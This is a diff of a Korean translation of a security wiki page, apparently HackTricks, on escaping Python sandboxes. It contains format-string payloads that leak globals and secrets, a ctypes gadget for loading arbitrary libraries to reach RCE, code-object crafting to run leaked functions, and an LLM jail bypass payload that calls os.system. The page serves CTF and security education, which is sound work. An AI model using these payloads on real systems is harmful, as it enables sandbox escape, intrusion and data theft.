+> 이건 정말 **훌륭합니다**. **globals, builtins, open 또는 무엇이든** 객체를 **찾고 있다면**, 이 스크립트를 사용해 **해당 객체를 찾을 수 있는 위치를 재귀적으로 검색하세요.**
 ```python
 import os, sys # Import these to find more gadgets
 
@@ -704,7 +706,7 @@ print(SEARCH_FOR)
 if __name__ == "__main__":
 main()
 ```
-이 script의 output은 다음 페이지에서 확인할 수 있습니다:
+이 스크립트의 출력은 다음 페이지에서 확인할 수 있습니다:
 
 
 {{#ref}}
@@ -713,7 +715,7 @@ https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-
 
 ## Python Format String
 
-**formatted**될 **string**을 python에 **send**하면 `{}`을 사용해 **python 내부 정보에 접근할 수 있습니다.** 예를 들어 앞의 예제를 사용해 globals 또는 builtins에 접근할 수 있습니다.<sup>[[14]](#references)</sup>
+Python에 **string**을 **format**하려는 경우, `{}`를 사용해 **Python 내부 정보**에 접근할 수 있습니다. 이전 예제를 사용하면, 예를 들어 globals 또는 builtins에 접근할 수 있습니다.<sup>[[14]](#references)</sup>
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -733,7 +735,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-일반적인 방식으로 **속성에 액세스**할 때는 `people_obj.__init__`처럼 **점**을 사용하고, **dict 요소**에는 따옴표 없이 **괄호**를 사용한다는 점에 유의하세요 `__globals__[CONFIG]`
+일반적인 방식으로 **속성에 액세스**할 때는 `people_obj.__init__`처럼 **점**을 사용하고, 따옴표 없이 **괄호**로 **dict 요소**에 액세스할 수 있다는 점에 유의하세요 `__globals__[CONFIG]`
 
 또한 `.__dict__`를 사용하여 객체의 요소를 열거할 수 있습니다 `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
@@ -742,7 +744,7 @@ format strings의 또 다른 흥미로운 특징은 각각 `!s`, `!r`, `!a`를 �
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-또한 클래스에서 **새로운 formatter를 구현**할 수도 있습니다:
+또한, 클래스에서 **새로운 formatter를 코딩**할 수도 있습니다:
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -753,10 +755,10 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**format** **string** 예제에 대한 **추가 예제**는 [**https://pyformat.info/**](https://pyformat.info)에서 확인할 수 있습니다.
+**더 많은 예시**는 **format** **string** 예시에 대해 [**https://pyformat.info/**](https://pyformat.info)에서 확인할 수 있습니다.
 
 > [!CAUTION]
-> **Python internal objects에서 민감한 정보를 읽는** gadgets에 대해서는 다음 페이지도 확인하세요:
+> Python internal objects에서 민감한 정보를 r**읽어오는 gadgets**에 대해서는 다음 페이지도 확인하세요:
 
 
 {{#ref}}
@@ -779,22 +781,22 @@ secret_variable = "clueless"
 x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
 str(x) # Out: clueless
 ```
-### LLM Jails bypass
+### LLM Jails 우회
 
 [여기](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce)에서: `().class.base.subclasses()[108].load_module('os').system('dir')`.<sup>[[12]](#references)</sup>
 
-### format에서 RCE로 libraries 로딩
+### format에서 라이브러리를 로딩하여 RCE 실행
 
-[**이 writeup의 TypeMonkey chall**](https://corgi.rip/posts/buckeye-writeups/)에 따르면, Python의 format string 취약점을 악용하여 디스크에서 임의의 libraries를 로드할 수 있습니다.<sup>[[13]](#references)</sup>
+[**이 writeup의 TypeMonkey chall**](https://corgi.rip/posts/buckeye-writeups/)에 따르면, Python의 format string 취약점을 악용하여 디스크에서 임의의 라이브러리를 로드할 수 있습니다.<sup>[[13]](#references)</sup>
 
-참고로, Python에서 어떤 action이 수행될 때마다 일부 function이 실행됩니다. 예를 들어 `2*3`은 **`(2).mul(3)`**을 실행하고, **`{'a':'b'}['a']`**는 **`{'a':'b'}.__getitem__('a')`**가 됩니다.
+다시 말해, Python에서 어떤 action이 수행될 때마다 어떤 function이 실행됩니다. 예를 들어 `2*3`은 **`(2).mul(3)`**을 실행하며, **`{'a':'b'}.__getitem__('a')`**가 되는 `{'a':'b'}['a']`도 마찬가지입니다.
 
-이와 같은 내용은 [**Python execution without calls**](#python-execution-without-calls) section에서 더 확인할 수 있습니다.
+[**Python execution without calls**](#python-execution-without-calls) 섹션에서 이와 같은 예시를 더 확인할 수 있습니다.
 
-Python format string vuln으로는 function을 실행할 수 없습니다(괄호를 사용할 수 없음). 따라서 `'{0.system("/bin/sh")}'.format(os)`와 같은 방식으로 RCE를 얻을 수 없습니다.\
-하지만 `[]`를 사용할 수 있습니다. 따라서 일반적인 Python library에 임의의 code를 실행하는 **`__getitem__`** 또는 **`__getattr__`** method가 있다면, 이를 악용하여 RCE를 얻을 수 있습니다.
+Python format string vuln은 function을 실행할 수 없으며(괄호를 사용할 수 없음), 따라서 `'{0.system("/bin/sh")}'.format(os)`와 같은 방식으로 RCE를 얻을 수 없습니다.\
+그러나 `[]`는 사용할 수 있습니다. 따라서 일반적인 Python library에 임의의 code를 실행하는 **`__getitem__`** 또는 **`__getattr__`** method가 있다면, 이를 악용하여 RCE를 얻을 수 있습니다.
 
-Python에서 이와 같은 gadget을 찾기 위해, 해당 writeup에서는 다음 [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code)를 제시합니다. 여기서 다음 [항목](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463)을 찾을 수 있습니다:
+Python에서 이와 같은 gadget을 찾기 위해, 해당 writeup에서는 다음 [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code)를 제시합니다. 그 결과 다음 [항목](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463)을 찾았습니다:
 ```python
 class LibraryLoader(object):
 def __init__(self, dlltype):
@@ -816,7 +818,7 @@ return getattr(self, name)
 cdll = LibraryLoader(CDLL)
 pydll = LibraryLoader(PyDLL)
 ```
-이 gadget은 **디스크에서 library를 load**할 수 있습니다. 따라서 공격 대상 서버에 올바르게 컴파일된 **load할 library를 어떻게든 write하거나 upload**해야 합니다.
+이 gadget은 **디스크에서 library를 load**할 수 있도록 합니다. 따라서 공격 대상 server에 올바르게 컴파일된 **load할 library를 어떻게든 write하거나 upload**해야 합니다.
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
@@ -825,11 +827,11 @@ pydll = LibraryLoader(PyDLL)
 ## Python Objects 분석
 
 > [!TIP]
-> **python bytecode**에 대해 자세히 **배우고** 싶다면 해당 주제를 다룬 이 **awesome** 포스트를 읽어 보세요: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+> **python bytecode**에 대해 심층적으로 **학습**하고 싶다면 이 주제에 관한 **훌륭한** 글을 읽어보세요: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
-일부 CTF에서는 **flag가 위치한 custom function**의 이름이 제공될 수 있으며, 이를 추출하려면 해당 **function**의 **internals**를 확인해야 합니다.
+일부 CTF에서는 **flag가 위치한 custom function**의 이름이 제공되며, 이를 추출하려면 해당 **function**의 **내부 구조**를 확인해야 합니다.
 
-다음은 검사할 function입니다:
+검사할 function은 다음과 같습니다:
 ```python
 def get_flag(some_input):
 var1=1
@@ -849,7 +851,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` 및 `func_globals`(동일)는 전역 환경을 가져옵니다. 예제에서 일부 imported modules, 일부 전역 변수 및 선언된 해당 내용을 확인할 수 있습니다:
+`__globals__` and `func_globals`(Same)는 global environment를 가져옵니다. 예제에서 일부 imported modules, 일부 global variables 및 선언된 해당 content를 확인할 수 있습니다:
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -950,7 +952,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Python sandbox에서 **`dis`를 import할 수 없는 경우** `get_flag.func_code.co_code`에서 함수의 **bytecode**를 가져와 로컬에서 **disassemble**할 수 있습니다. 로드되는 변수의 내용(`LOAD_CONST`)은 볼 수 없지만, (`LOAD_CONST`가 로드되는 변수의 offset도 알려 주기 때문에) `get_flag.func_code.co_consts`에서 해당 변수들을 추측할 수 있습니다.
+**Python sandbox에서 `dis`를 import할 수 없는 경우** 함수의 **bytecode**(`get_flag.func_code.co_code`)를 가져와 로컬에서 **disassemble**할 수 있습니다. 로드되는 변수의 내용(`LOAD_CONST`)은 볼 수 없지만, `LOAD_CONST`가 로드되는 변수의 offset도 알려 주므로 `get_flag.func_code.co_consts`에서 해당 값을 추측할 수 있습니다.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -974,8 +976,8 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## Python 컴파일
 
-이제 어떻게든 **실행할 수 없는 함수에 대한 정보를 dump할 수 있지만**, 해당 함수를 **실행해야 한다고** 상상해 봅시다.\
-다음 예시처럼 해당 함수의 **code object에 접근할 수는 있지만**, disassemble을 읽는 것만으로는 **flag를 어떻게 계산해야 하는지 알 수 없습니다** (_더 복잡한 `calc_flag` 함수를 상상해 보세요_).<sup>[[3]](#references)</sup>
+이제 어떻게든 **실행할 수 없는 함수에 대한 정보를 dump할 수 있지만**, 그것을 **실행해야 한다고** 상상해 봅시다.\
+다음 예시처럼 해당 함수의 **code object에 액세스할 수 있지만**, disassemble을 읽는 것만으로는 **flag를 어떻게 계산하는지 알 수 없습니다** (_더 복잡한 `calc_flag` 함수를 상상해 보세요_).<sup>[[3]](#references)</sup>
 ```python
 def get_flag(some_input):
 var1=1
@@ -990,7 +992,7 @@ return "Nope"
 ```
 ### code object 생성
 
-먼저 **code object를 생성하고 실행하는 방법**을 알아야 합니다. 그래야 leaked된 함수를 실행할 code object를 생성할 수 있습니다:
+먼저, **code object를 생성하고 실행하는 방법**을 알아야 합니다. 그래야 유출된 함수를 실행할 code object를 생성할 수 있습니다:
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -1010,7 +1012,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 > [!TIP]
-> Python 버전에 따라 `code_type`의 **parameters** 순서가 **다를 수 있습니다**. 현재 실행 중인 Python 버전에서 params 순서를 확인하는 가장 좋은 방법은 다음을 실행하는 것입니다:
+> Python 버전에 따라 `code_type`의 **parameters** 순서가 **다를 수 있습니다**. 현재 실행 중인 Python 버전에서 params의 순서를 확인하는 가장 좋은 방법은 다음을 실행하는 것입니다:
 >
 > ```
 > import types
@@ -1021,7 +1023,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ### leak된 function 재생성
 
 > [!WARNING]
-> 다음 예제에서는 function을 재생성하는 데 필요한 모든 데이터를 function code object에서 직접 가져옵니다. **실제 예제**에서는 function을 실행하는 데 필요한 모든 **values**인 **`code_type`**을 **leak해야 합니다**.
+> 다음 예제에서는 function을 재생성하는 데 필요한 모든 data를 function code object에서 직접 가져옵니다. **실제 예제**에서는 function을 실행하는 데 필요한 모든 **values**인 **`code_type`**을 **leak해야 합니다**.
 ```python
 fc = get_flag.__code__
 # In a real situation the values like fc.co_argcount are the ones you need to leak
@@ -1034,10 +1036,10 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### 방어 우회
 
-이 글의 앞부분에 있는 이전 예제에서 `compile` 함수를 사용해 **임의의 Python code를 실행하는 방법**을 확인할 수 있습니다. 이는 **loop를 포함한 전체 script를 모든 요소와 함께** **한 줄로** 실행할 수 있기 때문에 흥미롭습니다(그리고 `exec`를 사용해도 동일한 작업을 수행할 수 있습니다).\
-어쨌든 경우에 따라 로컬 머신에서 **compiled object**를 **생성**한 후 **CTF machine**에서 실행하는 것이 유용할 수 있습니다(예를 들어 CTF에 `compiled` function이 없기 때문입니다).
+이 게시물의 앞부분에 있는 이전 예시에서 **`compile` 함수를 사용해 모든 Python code를 실행하는 방법**을 볼 수 있습니다. 이는 **루프와 모든 요소가 포함된 전체 script를** **한 줄(one liner)**로 **실행할 수 있기 때문에** 흥미롭습니다(그리고 **`exec`**를 사용해 동일한 작업을 수행할 수도 있습니다).\
+어쨌든 때로는 로컬 머신에서 **compiled object**를 **생성**한 다음 **CTF machine**에서 실행하는 것이 유용할 수 있습니다(예를 들어 CTF에 `compiled` function이 없기 때문입니다).
 
-예를 들어, `./poc.py`를 읽는 function을 수동으로 compile하고 실행해 보겠습니다:
+예를 들어, _./poc.py_를 읽는 function을 수동으로 compile하고 실행해 보겠습니다:
 ```python
 #Locally
 def read():
@@ -1064,7 +1066,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-`eval` 또는 `exec`에 액세스할 수 없다면 **일반 함수를** 생성할 수 있지만, 이를 직접 호출하면 보통 _constructor not accessible in restricted mode_ 오류가 발생합니다. 따라서 **이 함수를 호출할 restricted environment 외부의 함수가 필요합니다.**
+`eval` 또는 `exec`에 접근할 수 없다면 **proper function**을 만들 수 있지만, 이를 직접 호출하면 대개 _constructor not accessible in restricted mode_ 오류가 발생합니다. 따라서 이 함수를 호출하려면 **restricted environment에 없는 function이 필요합니다.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1072,9 +1074,9 @@ ctype = type((lambda: None).func_code)
 f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
 f(42)
 ```
-## 컴파일된 Python 디컴파일
+## Compiled Python 디컴파일
 
-[**https://www.decompiler.com/**](https://www.decompiler.com) 같은 도구를 사용하면 주어진 컴파일된 Python code를 **디컴파일**할 수 있습니다.
+[**https://www.decompiler.com/**](https://www.decompiler.com)와 같은 도구를 사용하면 주어진 compiled Python code를 **decompile**할 수 있습니다.
 
 **이 튜토리얼을 확인하세요**:
 
@@ -1087,7 +1089,7 @@ f(42)
 
 ### Assert
 
-`-O` param을 사용해 optimization 상태로 실행된 Python은 assert 문과 **debug** 값에 따라 조건부로 실행되는 모든 code를 제거합니다.\
+`-O` 파라미터를 사용해 optimization 상태로 실행된 Python은 asset statements와 **debug** 값에 따라 조건부로 실행되는 모든 code를 제거합니다.\
 따라서 다음과 같은 check는:<sup>[[6]](#references)</sup>
 ```python
 def check_permission(super_user):
@@ -1102,19 +1104,19 @@ print(f"\nNot a Super User!!!\n")
 ## References
 
 - [1] [Pyjail](https://lbarman.ch/blog/pyjail/)
-- [2] [Python Sandbox 탈출 - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
+- [2] [Python Sandbox Escape - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
 - [3] [Python sandbox 탈출 (NdH 2013 quals writeup)](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
 - [4] [Python 'sandbox' 탈출](https://gynvael.coldwind.pl/n/python_sandbox_escape)
 - [5] [Eval은 정말 위험하다](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
-- [6] [Assertions를 통해 어떻게 해킹당할 수 있는가](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
+- [6] [Assertions가 어떻게 사용자를 해킹당하게 할 수 있는가](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 - [7] [CVE-2023-33733 (ReportLab rl_safe_eval expression evaluation RCE) – NVD](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
 - [8] [c53elyas/CVE-2023-33733 PoC 및 write-up](https://github.com/c53elyas/CVE-2023-33733)
-- [9] [0xdf: University (HTB) – xhtml2pdf/ReportLab CVE-2023-33733을 악용하여 RCE 획득](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
-- [10] [0xdf: HTB Interpreter – Mirth Connect XStream RCE, Mirth hash cracking 및 Flask f-string eval 권한 상승](https://0xdf.gitlab.io/2026/05/30/htb-interpreter.html)
-- [11] [SECCON CTF 2022 Quals: 작성자 writeups (English)](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)
-- [12] [LLM RCE의 해부학 - CyberArk Threat Research Blog](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce)
-- [13] [BuckeyeCTF 2024 작성자 Writeups](https://corgi.rip/posts/buckeye-writeups/)
+- [9] [0xdf: University (HTB) – xhtml2pdf/ReportLab CVE-2023-33733을 악용한 RCE 획득](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
+- [10] [0xdf: HTB Interpreter – Mirth Connect XStream RCE, Mirth hash cracking 및 Flask f-string eval privilege escalation](https://0xdf.gitlab.io/2026/05/30/htb-interpreter.html)
+- [11] [SECCON CTF 2022 Quals: Author writeups (English)](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)
+- [12] [LLM RCE의 해부 - CyberArk Threat Research Blog](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce)
+- [13] [BuckeyeCTF 2024 Author Writeups](https://corgi.rip/posts/buckeye-writeups/)
 - [14] [GeeksforGeeks – Python의 str.format() 취약점](https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/)
 - [15] [ur4ndom – GCTF 2022 Treebox](https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/)
-- [16] [checkoway.net - 단상 - Pickle](https://checkoway.net/musings/pickle)
+- [16] [checkoway.net - Musings - Pickle](https://checkoway.net/musings/pickle)
 {{#include ../../../banners/hacktricks-training.md}}
